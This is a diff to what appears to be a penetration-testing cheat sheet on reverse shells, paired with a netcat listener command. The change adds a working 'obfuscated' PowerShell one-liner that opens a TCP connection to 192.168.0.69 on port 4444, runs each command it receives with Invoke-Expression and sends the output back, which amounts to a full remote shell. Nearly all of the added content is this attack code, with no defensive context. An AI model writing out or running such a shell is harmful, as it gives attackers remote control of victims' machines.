@@ -8,6 +8,12 @@ description: nc -nlvp 4444
 
 {% embed url="https://book.hacktricks.xyz/pentesting-web/command-injection" %}
 
+{% code title="obfuscated PS rev 1-Liner" overflow="wrap" %}
+```powershell
+${var}=New-Object Net.Sockets.TcpClient('192.168.0.69',4444);${stream}=${var}.GetStream();${buffer}=@();While($true){if(${stream}.DataAvailable){$bufferSize=${stream}.Read($buffer,0,${buffer}.Length);${msg}=(New-Object Text.ASCIIEncoding).GetString($buffer,0,${bufferSize});${command}=(Invoke-Expression -Command $msg 2>&1 | Out-String );${msg}=$command+'PS '+${Pwd}.Path+'>';${buffer}=(New-Object Text.ASCIIEncoding).GetBytes($msg);${stream}.Write($buffer,0,$msg.length);$stream.Flush()};Start-Sleep -s 1}
+```
+{% endcode %}
+
 ### `rev.ps`
 
 {% code overflow="wrap" %}
